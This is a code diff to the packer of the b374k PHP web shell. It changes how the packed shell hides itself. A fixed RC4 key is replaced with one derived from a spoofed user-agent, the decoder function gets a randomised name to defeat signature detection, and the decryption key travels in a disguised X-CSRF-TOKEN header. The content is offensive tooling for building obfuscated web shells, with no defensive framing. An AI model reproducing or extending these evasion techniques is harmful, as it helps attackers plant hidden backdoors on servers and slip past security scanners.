@@ -19,7 +19,8 @@ $GLOBALS['packer']['theme'] = packer_get_theme();
 $GLOBALS['packer']['network_rs_dir'] = "./network/rs/";
 $GLOBALS['packer']['resources_dir'] = "./resources/";
 
-$debug_rc4_key = "QtIRzust76zO1haRabFYkbBv9WDnGvTx";
+$TRUST_USER_AGENT = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/64.0.3282.112 Mobile/15D60 Safari/604.1";
+$debug_rc4_key = md5($TRUST_USER_AGENT);
 $supported_network_rs_types = array('executable', 'gcc', 'java', 'php', 'python');
 
 require $GLOBALS['packer']['base_dir'].'jsPacker.php';
@@ -621,7 +622,8 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
     if ($output) {
         $header = "<?php\n";
     }
-	$rc4_function = $compress=="rc4" ? 'function rc4($a,$b){if(!$a){return 0;}$c=array();for($d=0;$d<256;$d++){$c[$d]=$d;}$e=0;for($d=0;$d<256;$d++){$e=($e+$c[$d]+ord($a[$d%strlen($a)]))%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;}$d=0;$e=0;$g="";for($h=0;$h<strlen($b);$h++){$d=($d+1)%256;$e=($e+$c[$d])%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;$g.=$b[$h]^chr($c[($c[$d]+$c[$e])%256]);}return $g;}function bds($s){$r='.'bzdecompress($s);if(gettype($r)=="integer"){phpinfo();return "";}else{return $r;}}':'';
+    $bds = '_'.generateRandomString(2);
+	$rc4_function = $compress=="rc4" ? 'function rc4($a,$b){if(!$a){return 0;}$c=array();for($d=0;$d<256;$d++){$c[$d]=$d;}$e=0;for($d=0;$d<256;$d++){$e=($e+$c[$d]+ord($a[$d%strlen($a)]))%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;}$d=0;$e=0;$g="";for($h=0;$h<strlen($b);$h++){$d=($d+1)%256;$e=($e+$c[$d])%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;$g.=$b[$h]^chr($c[($c[$d]+$c[$e])%256]);}return $g;}function '.$bds.'($s){$r='.'bzdecompress($s);if(gettype($r)=="integer"){phpinfo();return "";}else{return $r;}}':'';
 
 	if($strip=='yes'){
 		$phpcode = packer_strips($phpcode);
@@ -657,7 +659,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		$content = base64_encode($content);
 		if($compress!='no'){
 			if($compress=="rc4") {
-				$encoder = "bds(".$encoder_func."(isset(\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\'])?\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\']:0,ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
+				$encoder = $bds."(".$encoder_func."(isset(\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\'])?\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\']:md5(\$_SERVER[\\'HTTP_USER_AGENT\\']),ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
 			} else {
 				$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
 			}
@@ -679,7 +681,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 	if(packer_write_file($output, $code)){
 		chmod($output, 0777);
 		$is_rc4 = $compress=="rc4";
-		return array("Succeeded : [ <a href='".$output."' target='_blank'>".$output."</a> ] Filesize : ".filesize($output). ($is_rc4 ? (", RC4 Cipher Key : " . $GLOBALS['cipher_key']) : "") . "{[|a374k|]}", $code, null);
+		return array("Succeeded : [ <a href='".$output."' target='_blank'>".$output."</a> ] Filesize : ".filesize($output). ($is_rc4 ? (", X-Csrf-Token : " . $GLOBALS['cipher_key']) : "") . "{[|a374k|]}", $code, null);
 	}
 	return array("error{[|a374k|]}", null, null);
 }
